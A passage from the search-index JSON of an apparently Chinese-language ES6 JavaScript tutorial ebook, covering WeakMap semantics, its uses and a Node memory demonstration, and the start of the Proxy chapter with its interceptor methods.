\u91cc\u9762\u7684\u952e\u540d\u5bf9\u8c61\u548c\u6240\u5bf9\u5e94\u7684\u952e\u503c\u5bf9\u4f1a\u81ea\u52a8\u6d88\u5931\uff0c\u4e0d\u7528\u624b\u52a8\u5220\u9664\u5f15\u7528\u3002</p> <p>\u57fa\u672c\u4e0a\uff0c\u5982\u679c\u4f60\u8981\u5f80\u5bf9\u8c61\u4e0a\u6dfb\u52a0\u6570\u636e\uff0c\u53c8\u4e0d\u60f3\u5e72\u6270\u5783\u573e\u56de\u6536\u673a\u5236\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 WeakMap\u3002\u4e00\u4e2a\u5178\u578b\u5e94\u7528\u573a\u666f\u662f\uff0c\u5728\u7f51\u9875\u7684 DOM \u5143\u7d20\u4e0a\u6dfb\u52a0\u6570\u636e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528<code>WeakMap</code>\u7ed3\u6784\u3002\u5f53\u8be5 DOM \u5143\u7d20\u88ab\u6e05\u9664\uff0c\u5176\u6240\u5bf9\u5e94\u7684<code>WeakMap</code>\u8bb0\u5f55\u5c31\u4f1a\u81ea\u52a8\u88ab\u79fb\u9664\u3002</p> <pre><code>const wm = new WeakMap();\n\nconst element = document.getElementById('example');\n\nwm.set(element, 'some information');\nwm.get(element) // \"some information\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u65b0\u5efa\u4e00\u4e2a Weakmap \u5b9e\u4f8b\u3002\u7136\u540e\uff0c\u5c06\u4e00\u4e2a DOM \u8282\u70b9\u4f5c\u4e3a\u952e\u540d\u5b58\u5165\u8be5\u5b9e\u4f8b\uff0c\u5e76\u5c06\u4e00\u4e9b\u9644\u52a0\u4fe1\u606f\u4f5c\u4e3a\u952e\u503c\uff0c\u4e00\u8d77\u5b58\u653e\u5728 WeakMap \u91cc\u9762\u3002\u8fd9\u65f6\uff0cWeakMap \u91cc\u9762\u5bf9<code>element</code>\u7684\u5f15\u7528\u5c31\u662f\u5f31\u5f15\u7528\uff0c\u4e0d\u4f1a\u88ab\u8ba1\u5165\u5783\u573e\u56de\u6536\u673a\u5236\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0a\u9762\u7684 DOM \u8282\u70b9\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u662f<code>1</code>\uff0c\u800c\u4e0d\u662f<code>2</code>\u3002\u8fd9\u65f6\uff0c\u4e00\u65e6\u6d88\u9664\u5bf9\u8be5\u8282\u70b9\u7684\u5f15\u7528\uff0c\u5b83\u5360\u7528\u7684\u5185\u5b58\u5c31\u4f1a\u88ab\u5783\u573e\u56de\u6536\u673a\u5236\u91ca\u653e\u3002Weakmap \u4fdd\u5b58\u7684\u8fd9\u4e2a\u952e\u503c\u5bf9\uff0c\u4e5f\u4f1a\u81ea\u52a8\u6d88\u5931\u3002</p> <p>\u603b\u4e4b\uff0c<code>WeakMap</code>\u7684\u4e13\u7528\u573a\u5408\u5c31\u662f\uff0c\u5b83\u7684\u952e\u6240\u5bf9\u5e94\u7684\u5bf9\u8c61\uff0c\u53ef\u80fd\u4f1a\u5728\u5c06\u6765\u6d88\u5931\u3002<code>WeakMap</code>\u7ed3\u6784\u6709\u52a9\u4e8e\u9632\u6b62\u5185\u5b58\u6cc4\u6f0f\u3002</p> <p>\u6ce8\u610f\uff0cWeakMap \u5f31\u5f15\u7528\u7684\u53ea\u662f\u952e\u540d\uff0c\u800c\u4e0d\u662f\u952e\u503c\u3002\u952e\u503c\u4f9d\u7136\u662f\u6b63\u5e38\u5f15\u7528\u3002</p> <pre><code>const wm = new WeakMap();\nlet key = {};\nlet obj = {foo: 1};\n\nwm.set(key, obj);\nobj = null;\nwm.get(key)\n// Object {foo: 1}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u952e\u503c<code>obj</code>\u662f\u6b63\u5e38\u5f15\u7528\u3002\u6240\u4ee5\uff0c\u5373\u4f7f\u5728 WeakMap \u5916\u90e8\u6d88\u9664\u4e86<code>obj</code>\u7684\u5f15\u7528\uff0cWeakMap \u5185\u90e8\u7684\u5f15\u7528\u4f9d\u7136\u5b58\u5728\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#weakmap_1","title":"WeakMap \u7684\u8bed\u6cd5","text":"<p>WeakMap \u4e0e Map \u5728 API \u4e0a\u7684\u533a\u522b\u4e3b\u8981\u662f\u4e24\u4e2a\uff0c\u4e00\u662f\u6ca1\u6709\u904d\u5386\u64cd\u4f5c\uff08\u5373\u6ca1\u6709<code>keys()</code>\u3001<code>values()</code>\u548c<code>entries()</code>\u65b9\u6cd5\uff09\uff0c\u4e5f\u6ca1\u6709<code>size</code>\u5c5e\u6027\u3002\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5217\u51fa\u6240\u6709\u952e\u540d\uff0c\u67d0\u4e2a\u952e\u540d\u662f\u5426\u5b58\u5728\u5b8c\u5168\u4e0d\u53ef\u9884\u6d4b\uff0c\u8ddf\u5783\u573e\u56de\u6536\u673a\u5236\u662f\u5426\u8fd0\u884c\u76f8\u5173\u3002\u8fd9\u4e00\u523b\u53ef\u4ee5\u53d6\u5230\u952e\u540d\uff0c\u4e0b\u4e00\u523b\u5783\u573e\u56de\u6536\u673a\u5236\u7a81\u7136\u8fd0\u884c\u4e86\uff0c\u8fd9\u4e2a\u952e\u540d\u5c31\u6ca1\u4e86\uff0c\u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u4e0d\u786e\u5b9a\u6027\uff0c\u5c31\u7edf\u4e00\u89c4\u5b9a\u4e0d\u80fd\u53d6\u5230\u952e\u540d\u3002\u4e8c\u662f\u65e0\u6cd5\u6e05\u7a7a\uff0c\u5373\u4e0d\u652f\u6301<code>clear</code>\u65b9\u6cd5\u3002\u56e0\u6b64\uff0c<code>WeakMap</code>\u53ea\u6709\u56db\u4e2a\u65b9\u6cd5\u53ef\u7528\uff1a<code>get()</code>\u3001<code>set()</code>\u3001<code>has()</code>\u3001<code>delete()</code>\u3002</p> <pre><code>const wm = new WeakMap();\n\n// size\u3001forEach\u3001clear \u65b9\u6cd5\u90fd\u4e0d\u5b58\u5728\nwm.size // undefined\nwm.forEach // undefined\nwm.clear // undefined\n</code></pre>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#weakmap_2","title":"WeakMap \u7684\u793a\u4f8b","text":"<p>WeakMap \u7684\u4f8b\u5b50\u5f88\u96be\u6f14\u793a\uff0c\u56e0\u4e3a\u65e0\u6cd5\u89c2\u5bdf\u5b83\u91cc\u9762\u7684\u5f15\u7528\u4f1a\u81ea\u52a8\u6d88\u5931\u3002\u6b64\u65f6\uff0c\u5176\u4ed6\u5f15\u7528\u90fd\u89e3\u9664\u4e86\uff0c\u5df2\u7ecf\u6ca1\u6709\u5f15\u7528\u6307\u5411 WeakMap \u7684\u952e\u540d\u4e86\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8bc1\u5b9e\u90a3\u4e2a\u952e\u540d\u662f\u4e0d\u662f\u5b58\u5728\u3002</p> <p>\u8d3a\u5e08\u4fca\u8001\u5e08\u63d0\u793a\uff0c\u5982\u679c\u5f15\u7528\u6240\u6307\u5411\u7684\u503c\u5360\u7528\u7279\u522b\u591a\u7684\u5185\u5b58\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 Node \u7684<code>process.memoryUsage</code>\u65b9\u6cd5\u770b\u51fa\u6765\u3002\u6839\u636e\u8fd9\u4e2a\u601d\u8def\uff0c\u7f51\u53cbvtxf\u8865\u5145\u4e86\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <p>\u9996\u5148\uff0c\u6253\u5f00 Node \u547d\u4ee4\u884c\u3002</p> <pre><code>$ node --expose-gc\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>--expose-gc</code>\u53c2\u6570\u8868\u793a\u5141\u8bb8\u624b\u52a8\u6267\u884c\u5783\u573e\u56de\u6536\u673a\u5236\u3002</p> <p>\u7136\u540e\uff0c\u6267\u884c\u4e0b\u9762\u7684\u4ee3\u7801\u3002</p> <pre><code>// \u624b\u52a8\u6267\u884c\u4e00\u6b21\u5783\u573e\u56de\u6536\uff0c\u4fdd\u8bc1\u83b7\u53d6\u7684\u5185\u5b58\u4f7f\u7528\u72b6\u6001\u51c6\u786e\n&gt; global.gc();\nundefined\n\n// \u67e5\u770b\u5185\u5b58\u5360\u7528\u7684\u521d\u59cb\u72b6\u6001\uff0cheapUsed \u4e3a 4M \u5de6\u53f3\n&gt; process.memoryUsage();\n{ rss: 21106688,\n  heapTotal: 7376896,\n  heapUsed: 4153936,\n  external: 9059 }\n\n&gt; let wm = new WeakMap();\nundefined\n\n// \u65b0\u5efa\u4e00\u4e2a\u53d8\u91cf key\uff0c\u6307\u5411\u4e00\u4e2a 5*1024*1024 \u7684\u6570\u7ec4\n&gt; let key = new Array(5 * 1024 * 1024);\nundefined\n\n// \u8bbe\u7f6e WeakMap \u5b9e\u4f8b\u7684\u952e\u540d\uff0c\u4e5f\u6307\u5411 key \u6570\u7ec4\n// \u8fd9\u65f6\uff0ckey \u6570\u7ec4\u5b9e\u9645\u88ab\u5f15\u7528\u4e86\u4e24\u6b21\uff0c\n// \u53d8\u91cf key \u5f15\u7528\u4e00\u6b21\uff0cWeakMap \u7684\u952e\u540d\u5f15\u7528\u4e86\u7b2c\u4e8c\u6b21\n// \u4f46\u662f\uff0cWeakMap \u662f\u5f31\u5f15\u7528\uff0c\u5bf9\u4e8e\u5f15\u64ce\u6765\u8bf4\uff0c\u5f15\u7528\u8ba1\u6570\u8fd8\u662f1\n&gt; wm.set(key, 1);\nWeakMap {}\n\n&gt; global.gc();\nundefined\n\n// \u8fd9\u65f6\u5185\u5b58\u5360\u7528 heapUsed \u589e\u52a0\u5230 45M \u4e86\n&gt; process.memoryUsage();\n{ rss: 67538944,\n  heapTotal: 7376896,\n  heapUsed: 45782816,\n  external: 8945 }\n\n// \u6e05\u9664\u53d8\u91cf key \u5bf9\u6570\u7ec4\u7684\u5f15\u7528\uff0c\n// \u4f46\u6ca1\u6709\u624b\u52a8\u6e05\u9664 WeakMap \u5b9e\u4f8b\u7684\u952e\u540d\u5bf9\u6570\u7ec4\u7684\u5f15\u7528\n&gt; key = null;\nnull\n\n// \u518d\u6b21\u6267\u884c\u5783\u573e\u56de\u6536\n&gt; global.gc();\nundefined\n\n// \u5185\u5b58\u5360\u7528 heapUsed \u53d8\u56de 4M \u5de6\u53f3\uff0c\n// \u53ef\u4ee5\u770b\u5230 WeakMap \u7684\u952e\u540d\u5f15\u7528\u6ca1\u6709\u963b\u6b62 gc \u5bf9\u5185\u5b58\u7684\u56de\u6536\n&gt; process.memoryUsage();\n{ rss: 20639744,\n  heapTotal: 8425472,\n  heapUsed: 3979792,\n  external: 8956 }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u8981\u5916\u90e8\u7684\u5f15\u7528\u6d88\u5931\uff0cWeakMap \u5185\u90e8\u7684\u5f15\u7528\uff0c\u5c31\u4f1a\u81ea\u52a8\u88ab\u5783\u573e\u56de\u6536\u6e05\u9664\u3002\u7531\u6b64\u53ef\u89c1\uff0c\u6709\u4e86 WeakMap \u7684\u5e2e\u52a9\uff0c\u89e3\u51b3\u5185\u5b58\u6cc4\u6f0f\u5c31\u4f1a\u7b80\u5355\u5f88\u591a\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#weakmap_3","title":"WeakMap \u7684\u7528\u9014","text":"<p>\u524d\u6587\u8bf4\u8fc7\uff0cWeakMap \u5e94\u7528\u7684\u5178\u578b\u573a\u5408\u5c31\u662f DOM \u8282\u70b9\u4f5c\u4e3a\u952e\u540d\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>let myElement = document.getElementById('logo');\nlet myWeakmap = new WeakMap();\n\nmyWeakmap.set(myElement, {timesClicked: 0});\n\nmyElement.addEventListener('click', function() {\n  let logoData = myWeakmap.get(myElement);\n  logoData.timesClicked++;\n}, false);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>myElement</code>\u662f\u4e00\u4e2a DOM \u8282\u70b9\uff0c\u6bcf\u5f53\u53d1\u751f<code>click</code>\u4e8b\u4ef6\uff0c\u5c31\u66f4\u65b0\u4e00\u4e0b\u72b6\u6001\u3002\u6211\u4eec\u5c06\u8fd9\u4e2a\u72b6\u6001\u4f5c\u4e3a\u952e\u503c\u653e\u5728 WeakMap \u91cc\uff0c\u5bf9\u5e94\u7684\u952e\u540d\u5c31\u662f<code>myElement</code>\u3002\u4e00\u65e6\u8fd9\u4e2a DOM \u8282\u70b9\u5220\u9664\uff0c\u8be5\u72b6\u6001\u5c31\u4f1a\u81ea\u52a8\u6d88\u5931\uff0c\u4e0d\u5b58\u5728\u5185\u5b58\u6cc4\u6f0f\u98ce\u9669\u3002</p> <p>WeakMap \u7684\u53e6\u4e00\u4e2a\u7528\u5904\u662f\u90e8\u7f72\u79c1\u6709\u5c5e\u6027\u3002</p> <pre><code>const _counter = new WeakMap();\nconst _action = new WeakMap();\n\nclass Countdown {\n  constructor(counter, action) {\n    _counter.set(this, counter);\n    _action.set(this, action);\n  }\n  dec() {\n    let counter = _counter.get(this);\n    if (counter &lt; 1) return;\n    counter--;\n    _counter.set(this, counter);\n    if (counter === 0) {\n      _action.get(this)();\n    }\n  }\n}\n\nconst c = new Countdown(2, () =&gt; console.log('DONE'));\n\nc.dec()\nc.dec()\n// DONE\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Countdown</code>\u7c7b\u7684\u4e24\u4e2a\u5185\u90e8\u5c5e\u6027<code>_counter</code>\u548c<code>_action</code>\uff0c\u662f\u5b9e\u4f8b\u7684\u5f31\u5f15\u7528\uff0c\u6240\u4ee5\u5982\u679c\u5220\u9664\u5b9e\u4f8b\uff0c\u5b83\u4eec\u4e5f\u5c31\u968f\u4e4b\u6d88\u5931\uff0c\u4e0d\u4f1a\u9020\u6210\u5185\u5b58\u6cc4\u6f0f\u3002</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/","title":"Proxy","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 33507  \u9605\u8bfb68\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/14-Proxy/#_1","title":"\u6982\u8ff0","text":"<p>Proxy \u7528\u4e8e==\u4fee\u6539\u67d0\u4e9b\u64cd\u4f5c\u7684\u9ed8\u8ba4\u884c\u4e3a==\uff0c\u7b49\u540c\u4e8e\u5728\u8bed\u8a00\u5c42\u9762\u505a\u51fa\u4fee\u6539\uff0c\u6240\u4ee5\u5c5e\u4e8e\u4e00\u79cd\u201c\u5143\u7f16\u7a0b\u201d\uff08meta programming\uff09\uff0c\u5373\u5bf9\u7f16\u7a0b\u8bed\u8a00\u8fdb\u884c\u7f16\u7a0b\u3002</p> <p>Proxy \u53ef\u4ee5\u7406\u89e3\u6210\uff0c\u5728\u76ee\u6807\u5bf9\u8c61\u4e4b\u524d\u67b6\u8bbe\u4e00\u5c42\u201c\u62e6\u622a\u201d\uff0c\u5916\u754c\u5bf9\u8be5\u5bf9\u8c61\u7684\u8bbf\u95ee\uff0c\u90fd\u5fc5\u987b\u5148\u901a\u8fc7\u8fd9\u5c42\u62e6\u622a\uff0c\u56e0\u6b64\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u5bf9\u5916\u754c\u7684\u8bbf\u95ee\u8fdb\u884c\u8fc7\u6ee4\u548c\u6539\u5199\u3002Proxy \u8fd9\u4e2a\u8bcd\u7684\u539f\u610f\u662f\u4ee3\u7406\uff0c\u7528\u5728\u8fd9\u91cc\u8868\u793a\u7531\u5b83\u6765\u201c\u4ee3\u7406\u201d\u67d0\u4e9b\u64cd\u4f5c\uff0c\u53ef\u4ee5\u8bd1\u4e3a\u201c\u4ee3\u7406\u5668\u201d\u3002</p> <pre><code>var obj = new Proxy({}, {\n  get: function (target, key, receiver) {\n    console.log(`getting ${key}!`);\n    return Reflect.get(target, key, receiver);\n  },\n  set: function (target, key, value, receiver) {\n    console.log(`setting ${key}!`);\n    return Reflect.set(target, key, value, receiver);\n  }\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5bf9\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u67b6\u8bbe\u4e86\u4e00\u5c42\u62e6\u622a\uff0c\u91cd\u5b9a\u4e49\u4e86\u5c5e\u6027\u7684\u8bfb\u53d6\uff08<code>get</code>\uff09\u548c\u8bbe\u7f6e\uff08<code>set</code>\uff09\u884c\u4e3a\u3002\u8fd9\u91cc\u6682\u65f6\u5148\u4e0d\u89e3\u91ca\u5177\u4f53\u7684\u8bed\u6cd5\uff0c\u53ea\u770b\u8fd0\u884c\u7ed3\u679c\u3002\u5bf9\u8bbe\u7f6e\u4e86\u62e6\u622a\u884c\u4e3a\u7684\u5bf9\u8c61<code>obj</code>\uff0c\u53bb\u8bfb\u5199\u5b83\u7684\u5c5e\u6027\uff0c\u5c31\u4f1a\u5f97\u5230\u4e0b\u9762\u7684\u7ed3\u679c\u3002</p> <pre><code>obj.count = 1\n//  setting count!\n++obj.count\n//  getting count!\n//  setting count!\n//  2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0cProxy \u5b9e\u9645\u4e0a\u91cd\u8f7d\uff08overload\uff09\u4e86\u70b9\u8fd0\u7b97\u7b26\uff0c\u5373\u7528\u81ea\u5df1\u7684\u5b9a\u4e49\u8986\u76d6\u4e86\u8bed\u8a00\u7684\u539f\u59cb\u5b9a\u4e49\u3002</p> <p>ES6 \u539f\u751f\u63d0\u4f9b Proxy \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 Proxy \u5b9e\u4f8b\u3002</p> <pre><code>var proxy = new Proxy(target, handler);\nvar proxy = new Proxy(target, handler);\n</code></pre> <p>Proxy \u5b9e\u9645\u4e0a\u6ca1\u6709\u4f7f\u7528\u8fc7\uff0c\u4e0b\u9762\u7684\u5b9e\u4f8b\u65b9\u6cd5\u7b80\u5355\u8fc7\u4e86\u4e00\u6b21\uff0c\u9700\u8981\u7684\u65f6\u5019\u518d\u8be6\u7ec6\u5b66\u4e60\u3002</p> <p>Proxy \u5bf9\u8c61\u7684\u6240\u6709\u7528\u6cd5\uff0c\u90fd\u662f\u4e0a\u9762\u8fd9\u79cd\u5f62\u5f0f\uff0c\u4e0d\u540c\u7684\u53ea\u662f<code>handler</code>\u53c2\u6570\u7684\u5199\u6cd5\u3002\u5176\u4e2d\uff0c<code>new Proxy()</code>\u8868\u793a\u751f\u6210\u4e00\u4e2a<code>Proxy</code>\u5b9e\u4f8b\uff0c<code>target</code>\u53c2\u6570\u8868\u793a\u6240\u8981\u62e6\u622a\u7684\u76ee\u6807\u5bf9\u8c61\uff0c<code>handler</code>\u53c2\u6570\u4e5f\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u6765\u5b9a\u5236\u62e6\u622a\u884c\u4e3a\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u62e6\u622a\u8bfb\u53d6\u5c5e\u6027\u884c\u4e3a\u7684\u4f8b\u5b50\u3002</p> <pre><code>var proxy = new Proxy({}, {\n  get: function(target, property) {\n    return 35;\n  }\n});\n\nproxy.time // 35\nproxy.name // 35\nproxy.title // 35\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c<code>Proxy</code>\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6240\u8981\u4ee3\u7406\u7684\u76ee\u6807\u5bf9\u8c61\uff08\u4e0a\u4f8b\u662f\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff09\uff0c\u5373\u5982\u679c\u6ca1\u6709<code>Proxy</code>\u7684\u4ecb\u5165\uff0c\u64cd\u4f5c\u539f\u6765\u8981\u8bbf\u95ee\u7684\u5c31\u662f\u8fd9\u4e2a\u5bf9\u8c61\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u88ab\u4ee3\u7406\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u5bf9\u5e94\u7684\u5904\u7406\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c06\u62e6\u622a\u5bf9\u5e94\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\uff0c\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u914d\u7f6e\u5bf9\u8c61\u6709\u4e00\u4e2a<code>get</code>\u65b9\u6cd5\uff0c\u7528\u6765\u62e6\u622a\u5bf9\u76ee\u6807\u5bf9\u8c61\u5c5e\u6027\u7684\u8bbf\u95ee\u8bf7\u6c42\u3002<code>get</code>\u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\u5206\u522b\u662f\u76ee\u6807\u5bf9\u8c61\u548c\u6240\u8981\u8bbf\u95ee\u7684\u5c5e\u6027\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u7531\u4e8e\u62e6\u622a\u51fd\u6570\u603b\u662f\u8fd4\u56de<code>35</code>\uff0c\u6240\u4ee5\u8bbf\u95ee\u4efb\u4f55\u5c5e\u6027\u90fd\u5f97\u5230<code>35</code>\u3002</p> <p>\u6ce8\u610f\uff0c\u8981\u4f7f\u5f97<code>Proxy</code>\u8d77\u4f5c\u7528\uff0c\u5fc5\u987b\u9488\u5bf9<code>Proxy</code>\u5b9e\u4f8b\uff08\u4e0a\u4f8b\u662f<code>proxy</code>\u5bf9\u8c61\uff09\u8fdb\u884c\u64cd\u4f5c\uff0c\u800c\u4e0d\u662f\u9488\u5bf9\u76ee\u6807\u5bf9\u8c61\uff08\u4e0a\u4f8b\u662f\u7a7a\u5bf9\u8c61\uff09\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u5982\u679c<code>handler</code>\u6ca1\u6709\u8bbe\u7f6e\u4efb\u4f55\u62e6\u622a\uff0c\u90a3\u5c31\u7b49\u540c\u4e8e\u76f4\u63a5\u901a\u5411\u539f\u5bf9\u8c61\u3002</p> <pre><code>var target = {};\nvar handler = {};\nvar proxy = new Proxy(target, handler);\nproxy.a = 'b';\ntarget.a // \"b\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>handler</code>\u662f\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u6ca1\u6709\u4efb\u4f55\u62e6\u622a\u6548\u679c\uff0c\u8bbf\u95ee<code>proxy</code>\u5c31\u7b49\u540c\u4e8e\u8bbf\u95ee<code>target</code>\u3002</p> <p>\u4e00\u4e2a\u6280\u5de7\u662f\u5c06 Proxy \u5bf9\u8c61\uff0c\u8bbe\u7f6e\u5230<code>object.proxy</code>\u5c5e\u6027\uff0c\u4ece\u800c\u53ef\u4ee5\u5728<code>object</code>\u5bf9\u8c61\u4e0a\u8c03\u7528\u3002</p> <pre><code>var object = { proxy: new Proxy(target, handler) };\n</code></pre> <p>Proxy \u5b9e\u4f8b\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\u3002</p> <pre><code>var proxy = new Proxy({}, {\n  get: function(target, property) {\n    return 35;\n  }\n});\n\nlet obj = Object.create(proxy);\nobj.time // 35\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>proxy</code>\u5bf9\u8c61\u662f<code>obj</code>\u5bf9\u8c61\u7684\u539f\u578b\uff0c<code>obj</code>\u5bf9\u8c61\u672c\u8eab\u5e76\u6ca1\u6709<code>time</code>\u5c5e\u6027\uff0c\u6240\u4ee5\u6839\u636e\u539f\u578b\u94fe\uff0c\u4f1a\u5728<code>proxy</code>\u5bf9\u8c61\u4e0a\u8bfb\u53d6\u8be5\u5c5e\u6027\uff0c\u5bfc\u81f4\u88ab\u62e6\u622a\u3002</p> <p>\u540c\u4e00\u4e2a\u62e6\u622a\u5668\u51fd\u6570\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u62e6\u622a\u591a\u4e2a\u64cd\u4f5c\u3002</p> <pre><code>var handler = {\n  get: function(target, name) {\n    if (name === 'prototype') {\n      return Object.prototype;\n    }\n    return 'Hello, ' + name;\n  },\n\n  apply: function(target, thisBinding, args) {\n    return args[0];\n  },\n\n  construct: function(target, args) {\n    return {value: args[1]};\n  }\n};\n\nvar fproxy = new Proxy(function(x, y) {\n  return x + y;\n}, handler);\n\nfproxy(1, 2) // 1\nnew fproxy(1, 2) // {value: 2}\nfproxy.prototype === Object.prototype // true\nfproxy.foo === \"Hello, foo\" // true\n</code></pre> <p>\u5bf9\u4e8e\u53ef\u4ee5\u8bbe\u7f6e\u3001\u4f46\u6ca1\u6709\u8bbe\u7f6e\u62e6\u622a\u7684\u64cd\u4f5c\uff0c\u5219\u76f4\u63a5\u843d\u5728\u76ee\u6807\u5bf9\u8c61\u4e0a\uff0c\u6309\u7167\u539f\u5148\u7684\u65b9\u5f0f\u4ea7\u751f\u7ed3\u679c\u3002</p> <p>\u4e0b\u9762\u662f Proxy \u652f\u6301\u7684\u62e6\u622a\u64cd\u4f5c\u4e00\u89c8\uff0c\u4e00\u5171 13 \u79cd\u3002</p> <ul> <li>get(target, propKey, receiver)\uff1a\u62e6\u622a\u5bf9\u8c61\u5c5e\u6027\u7684\u8bfb\u53d6\uff0c\u6bd4\u5982<code>proxy.foo</code>\u548c<code>proxy['foo']</code>\u3002</li> <li>set(target, propKey, value, receiver)\uff1a\u62e6\u622a\u5bf9\u8c61\u5c5e\u6027\u7684\u8bbe\u7f6e\uff0c\u6bd4\u5982<code>proxy.foo = v</code>\u6216<code>proxy['foo'] = v</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</li> <li>has(target, propKey)\uff1a\u62e6\u622a<code>propKey in proxy</code>\u7684\u64cd\u4f5c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</li> <li>deleteProperty(target, propKey)\uff1a\u62e6\u622a<code>delete proxy[propKey]</code>\u7684\u64cd\u4f5c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</li> <li>ownKeys(target)\uff1a\u62e6\u622a<code>Object.getOwnPropertyNames(proxy)</code>\u3001<code>Object.getOwnPropertySymbols(proxy)</code>\u3001<code>Object.keys(proxy)</code>\u3001<code>for...in</code>\u5faa\u73af\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u76ee\u6807\u5bf9\u8c61\u6240\u6709\u81ea\u8eab\u7684\u5c5e\u6027\u7684\u5c5e\u6027\u540d\uff0c\u800c<code>Object.keys()</code>\u7684\u8fd4\u56de\u7ed3\u679c\u4ec5\u5305\u62ec\u76ee\u6807\u5bf9\u8c61\u81ea\u8eab\u7684\u53ef\u904d\u5386\u5c5e\u6027\u3002</li> <li>getOwnPropertyDescriptor(target, propKey)\uff1a\u62e6\u622a<code>Object.getOwnPropertyDescriptor(proxy, propKey)</code>\uff0c\u8fd4\u56de\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002</li> <li>defineProperty(target, propKey, propDesc)\uff1a\u62e6\u622a<code>Object.defineProperty(proxy, propKey, propDesc\uff09</code>\u3001<code>Object.defineProperties(proxy, propDescs)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</li> <li>preventExtensions(target)\uff1a\u62e6\u622a<code>Object.preventExtensions(proxy)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</li> <li>getPrototypeOf(target)\uff1a\u62e6\u622a<code>Object.getPrototypeOf(proxy)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u3002</li> <li>isExtensible(target)\uff1a\u62e6\u622a<code>Object.isExtensible(proxy)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002</li> <li>setPrototypeOf(target, proto)\uff1a\u62e6\u622a<code>Object.setPrototypeOf(proxy, proto)</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\u3002\u5982\u679c\u76ee\u6807\u5bf9\u8c61\u662f\u51fd\u6570\uff0c\u90a3\u4e48\u8fd8\u6709\u4e24\u79cd\u989d\u5916\u64cd\u4f5c\u53ef\u4ee5\u62e6\u622a\u3002</li> <li>apply(target, object, args)\uff1a\u62e6\u622a Proxy \u5b9e\u4f8b\u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982<code>proxy(...args)</code>\u3001<code>proxy.call(object, ...args)</code>\u3001<code>proxy.apply(...)</code>\u3002</li> <li>construct(target, args)\uff1a\u62e6\u622a Proxy 